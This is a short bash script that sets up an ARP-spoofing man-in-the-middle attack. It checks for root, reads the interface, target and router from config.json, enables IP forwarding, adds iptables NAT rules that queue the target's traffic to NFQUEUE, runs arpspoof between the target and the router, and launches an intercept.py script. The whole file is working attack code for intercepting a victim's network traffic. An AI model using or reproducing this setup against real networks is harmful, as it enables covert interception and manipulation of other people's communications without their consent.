#!/bin/bash

if [[ $EUID -ne 0 ]]; then
	echo "This script must be run by root"
	exit 1
fi

interface=`jq -r '.interface' config.json`
target=`jq -r '.target' config.json`
router=`jq -r '.router' config.json`

trap 'end' INT

function end() {
	kill $PID
	kill $PID2
	iptables -t nat -D PREROUTING 1
	iptables -t nat -D PREROUTING 1
	echo "Shutting down..."
	wait $PID
}

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A PREROUTING -i $interface -s $target -j NFQUEUE --queue-num 0
iptables -t nat -A PREROUTING -i $interface -d $target -j NFQUEUE --queue-num 1

arpspoof -i $interface -t $target -r $router > /dev/null 2>&1 &
PID=$!

./intercept.py 2>&1 &
PID2=$!

cat
